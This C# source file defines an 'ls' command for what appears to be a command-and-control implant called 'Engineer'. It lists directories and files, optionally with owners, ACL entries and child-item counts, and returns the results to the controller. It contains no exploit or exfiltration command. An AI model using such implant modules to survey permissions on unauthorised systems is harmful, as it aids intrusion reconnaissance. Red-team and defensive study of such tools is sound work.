using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
	public class ls : EngineerCommand
	{
		public override string Name => "ls" ;

		private static bool GetACLs { get; set; } = false; 
		private static bool IsRecursive { get; set; } = false;
		private static bool GetChildItemCount { get; set; } = false;
	
		public override async Task Execute(EngineerTask task)
		{
			if (!task.Arguments.TryGetValue("/path", out string path)) // if it fails to get a value from this argument then it will use the current path
			{
				path = Directory.GetCurrentDirectory();
            }
			//try to get the /recursive argument
			if (task.Arguments.TryGetValue("/recursive", out string recursive))
			{
				//if the argument is set to true then set the IsRecursive property to true
				if (recursive.Equals("true", StringComparison.CurrentCultureIgnoreCase))
				{
					IsRecursive = true;
				}
			}
			else
			{
				IsRecursive = false;
			}
			//try to get the /getacls argument
			if (task.Arguments.TryGetValue("/getacls", out string getacls))
			{
				//if the argument is set to true then set the GetACLs property to true
				if (getacls.Equals("true", StringComparison.CurrentCultureIgnoreCase))
				{
					GetACLs = true;
				}
			}
			else
			{
				GetACLs	= false;
			}
			//try to get the /getchilditemcount argument
			if (task.Arguments.TryGetValue("/getcount", out string getcount))
			{
				//if the argument is set to true then set the GetChildItemCount property to true
				if (getcount.Equals("true", StringComparison.CurrentCultureIgnoreCase))
				{
					GetChildItemCount = true;
				}
			}	
            else
            {
                GetChildItemCount = false;
            }	
			
            try
            {
				//check that the path is valid
				path.Trim();

                var Items  = GetDirectoryListing(path);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(Items, task,EngTaskStatus.Complete,TaskResponseType.FileSystemItem);
            }
            catch (Exception ex)
            {
				// Console.WriteLine(ex.Message);
	            //Console.WriteLine(ex.StackTrace);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
        
		
		
		public static List<FileSystemItem> GetDirectoryListing(string Path)
		{
			//SharpSploitResultList<FileSystemEntryResult> results = new SharpSploitResultList<FileSystemEntryResult>();
			var newResults = new List<FileSystemItem>();
			foreach (string dir in Directory.GetDirectories(Path))
            {
	            try
	            {
		            long childItemCount = 0; 


	                DirectoryInfo dirInfo = new DirectoryInfo(dir);
	                DirectorySecurity ds = null;
	                if (GetChildItemCount)
	                {
	                    //get the access control list for the directory, pull just the Access section and check if the current user has list directory access if not then set the child item count to -1 to indicate no access
	                    ds = dirInfo.GetAccessControl(AccessControlSections.All);
	                    AuthorizationRuleCollection rules = ds.GetAccessRules(true, true, typeof(SecurityIdentifier));
	                    bool hasListAccess = false;
	                    var groups = WindowsIdentity.GetCurrent().Groups;

	                    //if any of the rules deny list access then set the child item count to -1 to indicate no access 
	                    if (rules.OfType<FileSystemAccessRule>().Any(r =>
		                        (groups.Contains(r.IdentityReference) ||
		                         r.IdentityReference.Value == WindowsIdentity.GetCurrent().Name) &&
		                        r.FileSystemRights == FileSystemRights.ListDirectory &&
		                        r.AccessControlType == AccessControlType.Deny))
	                    {
		                    hasListAccess = false;
	                    }
	                    else
	                    {
		                    foreach (FileSystemAccessRule rule in rules)
		                    {
			                    //Console.WriteLine("for Dir: {0} Rule: {1}, {2}, {3}", dir, rule.FileSystemRights, rule.AccessControlType, rule.IdentityReference.Value);
			                    //check if the rule allows list directory access
			                    if ((rule.FileSystemRights & FileSystemRights.ListDirectory) ==
			                        FileSystemRights.ListDirectory)
			                    {
				                    //check if the current user or a group they are a part of is in the rule 
				                    if (rule.IdentityReference.Value == WindowsIdentity.GetCurrent().Name ||
				                        groups.Contains(rule.IdentityReference))
				                    {
					                    //if the rule is allow then set the child item count to 0 to indicate access but no items
					                    if (rule.AccessControlType == AccessControlType.Allow)
					                    {
						                    hasListAccess = true;
					                    }
				                    }
			                    }
		                    }
	                    }

	                    if (!hasListAccess)
	                    {
		                    // -1 means unknown or no access 
		                    childItemCount = -1;
	                    }
	                    else
	                    {
		                    try
		                    {
			                    childItemCount = Directory.GetDirectories(dir).Length + Directory.GetFiles(dir).Length;
		                    }
		                    catch (UnauthorizedAccessException)
		                    {
			                   // Console.WriteLine("Caught Unauthorized access Error");
		                    }
	                    }
	                }
					//get all the acl info for the directory and combine it into a string seperated by new lines 
	               // StringBuilder sb = new StringBuilder();
	                List<ACL> ACLList = new List<ACL>();
	                string _owner = "-";
	                if (GetACLs)
	                {
						if(ds == null)
						{
							ds = dirInfo.GetAccessControl(AccessControlSections.All);
	                    }
	                    _owner = dirInfo.GetAccessControl().GetOwner(typeof(NTAccount)).ToString();
	                    var ACEs = ds.GetAccessRules(true, true, typeof(NTAccount));
	                    foreach (FileSystemAccessRule rule in ACEs)
	                    {
		                    ACL acl = new ACL();
		                    acl.IdentityRef = rule.IdentityReference.Value;
		                    acl.AccessControlType = rule.AccessControlType.ToString();
		                    acl.FileSystemRights = rule.FileSystemRights.ToString();
		                    acl.IsInherited = rule.IsInherited;
		                    ACLList.Add(acl);
	                    }
	                }

					//string DirACL = sb.ToString();
					newResults.Add(new FileSystemItem
                    {
                        Name = dirInfo.FullName,
                        Length = 0,
                        Owner = _owner,
                        ChildItemCount = childItemCount,
                        CreationTimeUtc = dirInfo.CreationTimeUtc,
                        LastAccessTimeUtc = dirInfo.LastAccessTimeUtc,
                        LastWriteTimeUtc = dirInfo.LastWriteTimeUtc,
                        ACLs = ACLList,
                    });

	            }
	            catch (Exception e)
	            {
		            //Console.WriteLine(e.Message);
		           // Console.WriteLine(e.StackTrace);
	            }
                
            }
            foreach (string file in Directory.GetFiles(Path))
            {
                //get all the acl info for the file and combine it into a string seperated by new lines
                StringBuilder sb = new StringBuilder();
                FileInfo fileInfo = new FileInfo(file);
                List<ACL> ACLList = new List<ACL>();
                string _owner = "-"; 
                try
                {
	                if (GetACLs)
	                {
						//Console.WriteLine($"Getting ACLs for {file}");
						//check if the file is in use and if so then skip it
						var accessControl = fileInfo.GetAccessControl();
						_owner = accessControl.GetOwner(typeof(NTAccount)).ToString();
		               // Console.WriteLine($"Owner: {_owner}");
		                var ACEs = fileInfo.GetAccessControl().GetAccessRules(true, true, typeof(NTAccount));
		                //Console.WriteLine($"got back {ACEs.Count} ACEs");
		                
		                foreach (FileSystemAccessRule rule in ACEs)
		                {
			                ACL acl = new ACL();
			                acl.IdentityRef = rule.IdentityReference.Value;
			                acl.AccessControlType = rule.AccessControlType.ToString();
			                acl.FileSystemRights = rule.FileSystemRights.ToString();
			                acl.IsInherited = rule.IsInherited;
			                ACLList.Add(acl);
		                }
	                }
                }
                catch (Exception e) when ((e.HResult & 0x0000FFFF) == 32 ) 
                {
	                //Console.WriteLine(e.HResult);
	               // Console.WriteLine("There is a sharing violation.");
                }
                catch (Exception e)
				{
	               // Console.WriteLine(e.HResult & 0x0000FFFF);
	                //Console.WriteLine(e.Message);
	               // Console.WriteLine(e.StackTrace);
				}
                string FileACL = sb.ToString();
                
                newResults.Add(new FileSystemItem
				{
					Name = fileInfo.FullName,
					Length = fileInfo.Length,
					Owner = _owner,
					ChildItemCount = 0,
					CreationTimeUtc = fileInfo.CreationTimeUtc,
					LastAccessTimeUtc = fileInfo.LastAccessTimeUtc,
					LastWriteTimeUtc = fileInfo.LastWriteTimeUtc,
					ACLs = ACLList,
				});
            }
            return newResults;
		}
	}
	
	
	
}
